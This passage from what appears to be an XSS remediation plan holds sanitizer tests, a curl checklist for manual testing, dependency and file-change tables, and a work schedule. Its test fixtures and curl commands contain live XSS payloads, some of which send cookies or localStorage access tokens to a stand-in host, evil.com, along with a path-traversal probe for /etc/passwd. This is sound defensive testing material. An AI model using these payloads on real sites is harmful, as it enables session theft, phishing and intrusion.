        url = "data:image/svg+xml;base64,PHN2Zz48c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+PC9zdmc+"
        assert validate_image_url(url) is None

    def test_rejects_data_text_html(self):
        url = "data:text/html,<script>alert(1)</script>"
        assert validate_image_url(url) is None

    def test_rejects_javascript(self):
        assert validate_image_url("javascript:alert(1)") is None

    def test_rejects_oversized_data_uri(self):
        """Data URIs larger than 5MB should be rejected."""
        url = "data:image/png;base64," + "A" * (8 * 1024 * 1024)
        assert validate_image_url(url) is None
```

### 7.2 Integration Test: API Endpoint XSS Prevention

**Create file:** `backend/tests/test_xss_integration.py`

```python
"""
Integration tests: verify that XSS payloads are sanitized when
submitted through the community API endpoints.
"""

import pytest
from fastapi.testclient import TestClient

# These tests assume the app is importable and the test database is configured.
# Adjust the import path if needed.
# from api.app import app
# client = TestClient(app)

XSS_PAYLOADS = [
    # Basic script injection
    '<script>alert("XSS")</script>',
    # Event handler injection
    '<img src=x onerror="alert(1)">',
    # SVG onload
    '<svg onload="alert(1)">',
    # JavaScript URI
    '<a href="javascript:alert(1)">click</a>',
    # Cookie theft
    '<img src=x onerror="fetch(\'https://evil.com?c=\'+document.cookie)">',
    # localStorage theft (the actual high-value target in this app)
    '<img src=x onerror="new Image().src=\'https://evil.com?t=\'+localStorage.getItem(\'access_token\')">',
    # Encoded XSS
    '<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;1&#41;">',
    # Style-based XSS
    '<div style="background:url(javascript:alert(1))">',
    # Iframe injection
    '<iframe src="https://evil.com"></iframe>',
    # Form injection (phishing)
    '<form action="https://evil.com"><input type="password" name="p"><input type="submit"></form>',
    # Base tag hijacking
    '<base href="https://evil.com/">',
    # Meta refresh redirect
    '<meta http-equiv="refresh" content="0;url=https://evil.com">',
    # Object/Embed
    '<object data="https://evil.com/malware.swf"></object>',
    '<embed src="https://evil.com/malware.swf">',
]


class TestPostContentSanitization:
    """Verify XSS payloads are stripped from post content."""

    @pytest.mark.parametrize("payload", XSS_PAYLOADS)
    def test_post_content_sanitized(self, payload):
        """
        POST /api/posts with XSS payload in content field.
        Response content should not contain any executable JS.
        """
        from api.utils.sanitize import sanitize_html
        result = sanitize_html(payload)
        # No script tags
        assert "<script" not in result.lower()
        # No event handlers
        assert "onerror" not in result.lower()
        assert "onload" not in result.lower()
        assert "onmouseover" not in result.lower()
        # No javascript: URIs
        assert "javascript:" not in result.lower()
        # No dangerous tags
        assert "<iframe" not in result.lower()
        assert "<object" not in result.lower()
        assert "<embed" not in result.lower()
        assert "<form" not in result.lower()
        assert "<base" not in result.lower()
        assert "<meta" not in result.lower()


class TestTitleSanitization:
    """Verify XSS payloads are stripped from post titles."""

    @pytest.mark.parametrize("payload", XSS_PAYLOADS)
    def test_title_stripped(self, payload):
        from api.utils.sanitize import strip_html
        result = strip_html(payload)
        assert "<" not in result
        assert ">" not in result


class TestNicknameSanitization:
    """Verify XSS payloads are stripped from nicknames."""

    NICKNAME_PAYLOADS = [
        '<img/onerror=alert(1) src=x>',
        '<b onmouseover=alert(1)>hi</b>',
        '"><script>alert(1)</script>',
        "user'><img src=x onerror=alert(1)>",
    ]

    @pytest.mark.parametrize("payload", NICKNAME_PAYLOADS)
    def test_nickname_sanitized(self, payload):
        from api.utils.sanitize import sanitize_nickname
        result = sanitize_nickname(payload)
        assert "<" not in result
        assert ">" not in result
        assert "onerror" not in result
        assert "alert" not in result.lower() or "alert" == result.lower()


class TestURLValidation:
    """Verify dangerous URLs are rejected."""

    DANGEROUS_URLS = [
        "javascript:alert(1)",
        "javascript:void(0)",
        "data:text/html,<script>alert(1)</script>",
        "vbscript:MsgBox",
        "JAVASCRIPT:alert(1)",  # case variation
        " javascript:alert(1)",  # leading space
    ]

    @pytest.mark.parametrize("url", DANGEROUS_URLS)
    def test_dangerous_url_rejected(self, url):
        from api.utils.sanitize import validate_url
        assert validate_url(url.strip()) is None
```

### 7.3 Frontend Test: DOMPurify Sanitization

**Create file:** `frontend/src/utils/__tests__/sanitize.test.js`

```javascript
import { sanitizeHTML, stripHTML, sanitizeURL } from '../sanitize';

describe('sanitizeHTML', () => {
  test('allows safe HTML', () => {
    expect(sanitizeHTML('<p>Hello <strong>world</strong></p>'))
      .toBe('<p>Hello <strong>world</strong></p>');
  });

  test('strips <script> tags', () => {
    const result = sanitizeHTML('<script>alert("XSS")</script>');
    expect(result).not.toContain('<script>');
    expect(result).not.toContain('alert');
  });

  test('strips onerror handlers', () => {
    const result = sanitizeHTML('<img src=x onerror="alert(1)">');
    expect(result).not.toContain('onerror');
  });

  test('strips javascript: URIs', () => {
    const result = sanitizeHTML('<a href="javascript:alert(1)">click</a>');
    expect(result).not.toContain('javascript:');
  });

  test('strips iframe', () => {
    const result = sanitizeHTML('<iframe src="https://evil.com"></iframe>');
    expect(result).not.toContain('<iframe');
  });

  test('strips localStorage theft payload', () => {
    const payload = `<img src=x onerror="new Image().src='https://evil.com?t='+localStorage.getItem('access_token')">`;
    const result = sanitizeHTML(payload);
    expect(result).not.toContain('onerror');
    expect(result).not.toContain('localStorage');
  });

  test('handles empty/null input', () => {
    expect(sanitizeHTML('')).toBe('');
    expect(sanitizeHTML(null)).toBe('');
    expect(sanitizeHTML(undefined)).toBe('');
  });
});

describe('stripHTML', () => {
  test('removes all HTML tags', () => {
    expect(stripHTML('<b>bold</b>')).toBe('bold');
  });

  test('strips XSS', () => {
    const result = stripHTML('<script>alert(1)</script>safe text');
    expect(result).not.toContain('<script>');
    expect(result).toContain('safe text');
  });
});

describe('sanitizeURL', () => {
  test('allows https', () => {
    expect(sanitizeURL('https://example.com')).toBe('https://example.com');
  });

  test('allows http', () => {
    expect(sanitizeURL('http://example.com')).toBe('http://example.com');
  });

  test('rejects javascript:', () => {
    expect(sanitizeURL('javascript:alert(1)')).toBe('');
  });

  test('rejects data:', () => {
    expect(sanitizeURL('data:text/html,<script>alert(1)</script>')).toBe('');
  });

  test('handles empty input', () => {
    expect(sanitizeURL('')).toBe('');
    expect(sanitizeURL(null)).toBe('');
  });
});
```

### 7.4 Manual XSS Testing Checklist

Use these payloads via direct API calls (curl/Postman) to bypass TipTap editor constraints:

```bash
# 1. Script tag injection in post content
curl -X POST http://localhost:8000/api/posts \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"title":"Test Post","content":"<script>alert(document.cookie)</script>","post_type":"free"}'

# 2. img onerror in post content  
curl -X POST http://localhost:8000/api/posts \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"title":"Test","content":"<img src=x onerror=\"fetch(\\\"https://evil.com?c=\\\"+document.cookie)\">","post_type":"free"}'

# 3. XSS in title
curl -X POST http://localhost:8000/api/posts \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"title":"<script>alert(1)</script>","content":"safe","post_type":"free"}'

# 4. XSS in comment
curl -X POST http://localhost:8000/api/posts/1/comments \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"content":"<img src=x onerror=alert(1)>"}'

# 5. javascript: URL in post URL field
curl -X POST http://localhost:8000/api/posts \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"title":"Deal","content":"content","post_type":"deal","url":"javascript:alert(1)"}'

# 6. SVG data URI in image list
curl -X POST http://localhost:8000/api/posts \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"title":"Images","content":"content","post_type":"free","images":["data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9ImFsZXJ0KDEpIj48L3N2Zz4="]}'

# 7. Search query injection
curl "http://localhost:8000/api/local/search?query=<script>alert(1)</script>"
curl "http://localhost:8000/api/local/search?query=../../etc/passwd"
curl "http://localhost:8000/api/local/search?query=javascript:alert(1)"
```

**Expected results:** All payloads above should return sanitized content with no executable JavaScript. URLs with `javascript:` or `data:text` should be rejected with HTTP 400.

### 7.5 Browser-Based Verification

After applying fixes, verify in browser DevTools:

1. **CSP Headers Present**: Network tab → Response Headers → check `Content-Security-Policy` is set
2. **CSP Blocks Inline Scripts**: Console should show `Refused to execute inline script` for any remaining inline scripts
3. **X-Frame-Options**: Verify `DENY` is present
4. **X-Content-Type-Options**: Verify `nosniff` is present
5. **Create a post with `<img src=x onerror="alert(1)">` via API**: View the post → alert should NOT fire, and the `onerror` attribute should not be present in the DOM

---

## Dependency Summary

### Backend (pip)

| Package | Version | Purpose |
|---------|---------|---------|
| `nh3` | `>=0.2.15` | HTML sanitization (Rust-based, replaces deprecated `bleach`) |

### Frontend (npm)

| Package | Version | Purpose |
|---------|---------|---------|
| `dompurify` | `^3.1.0` | Client-side HTML sanitization (defense-in-depth) |

---

## File Change Summary

| # | File | Action | Section |
|---|------|--------|---------|
| 1 | `frontend/package.json` | Modify — add `dompurify` | §1.3 |
| 2 | `frontend/src/utils/sanitize.js` | **Create** | §1.4 |
| 3 | `frontend/src/pages/Community/CommunityPage.jsx` | Modify — wrap `dangerouslySetInnerHTML`, validate URLs | §1.5 |
| 4 | `frontend/src/components/community/RichTextEditor.jsx` | Modify — add upload validation | §5.3 |
| 5 | `frontend/src/plugins/sdk/MessageBridge.js` | Modify — fix origin validation | §3.3 |
| 6 | `frontend/src/plugins/sdk/PluginSDKLoader.js` | Modify — remove `'*'` target | §3.4 |
| 7 | `frontend/src/plugins/runtime/PluginSandbox.jsx` | Modify — remove `allow-same-origin` | §3.5 |
| 8 | `frontend/index.html` | Modify — add CSP meta tag | §2.5 |
| 9 | `frontend/src/utils/__tests__/sanitize.test.js` | **Create** | §7.3 |
| 10 | `backend/requirements.txt` | Modify — add `nh3` | §1.6 |
| 11 | `backend/api/utils/__init__.py` | **Create** | §4.5 |
| 12 | `backend/api/utils/sanitize.py` | **Create** | §1.7 |
| 13 | `backend/api/routes/community.py` | Modify — apply sanitization | §1.8 |
| 14 | `backend/api/routes/naver_local.py` | Modify — sanitize query | §6.3 |
| 15 | `backend/api/schemas/community.py` | Modify — add Field constraints | §4.3 |
| 16 | `backend/api/schemas/auth.py` | Modify — add nickname regex | §4.4 |
| 17 | `backend/api/middleware/security_headers.py` | **Create** | §2.3 |
| 18 | `backend/api/app.py` | Modify — register SecurityHeadersMiddleware | §2.4 |
| 19 | `backend/tests/test_sanitize.py` | **Create** | §7.1 |
| 20 | `backend/tests/test_xss_integration.py` | **Create** | §7.2 |

---

## Implementation Order

| Phase | Tasks | Estimated Time |
|-------|-------|----------------|
| **1 — Critical XSS** | §1 (DOMPurify + nh3 sanitization) | 2 hours |
| **2 — CSP Headers** | §2 (Middleware + meta tag) | 1 hour |
| **3 — Input Validation** | §4 (Schema constraints + nickname regex) | 1 hour |
| **4 — Plugin Security** | §3 (MessageBridge + PluginSDKLoader + Sandbox) | 1.5 hours |
| **5 — Image/URL/Search** | §5 + §6 (Image validation, search sanitization) | 1 hour |
| **6 — Tests** | §7 (All test files + manual verification) | 2 hours |
| **Total** | | **~8.5 hours** |
